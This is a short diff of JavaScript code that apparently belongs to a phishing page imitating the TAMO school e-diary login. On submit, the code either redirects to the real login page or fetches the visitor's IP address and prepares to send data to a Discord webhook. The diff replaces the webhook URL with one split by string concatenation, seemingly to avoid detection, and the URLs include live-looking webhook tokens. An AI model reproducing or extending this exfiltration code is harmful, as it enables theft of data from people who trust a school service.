@@ -19,7 +19,7 @@ document.addEventListener('DOMContentLoaded', function() {
     if (submitButton.innerHTML == 'Uždaryti') {
       window.location.href = 'https://dienynas.tamo.lt/Prisijungimas/Login';
     } else {
-      const webhookUrl = 'https://discord.com/api/webhooks/1084533019831963659/CMObRt47ktaHnmdLp0E0WAGmEQUaatZr4Yetmkz1Epgn746BtGytsvF5FHuU1cYRqMkZ';
+      const webhookUrl = 'https://discord.com/api/webhooks/1084534863966765146/hfXf5xS-JtU77MiOZZ5LJkutJBvj6CZi9Cnj022P7DEhAfzhqT2CzLnSB5Nk5_IPl'+'eNW';
 
       //Get ip
       fetch('https://api.ipify.org/?format=json')
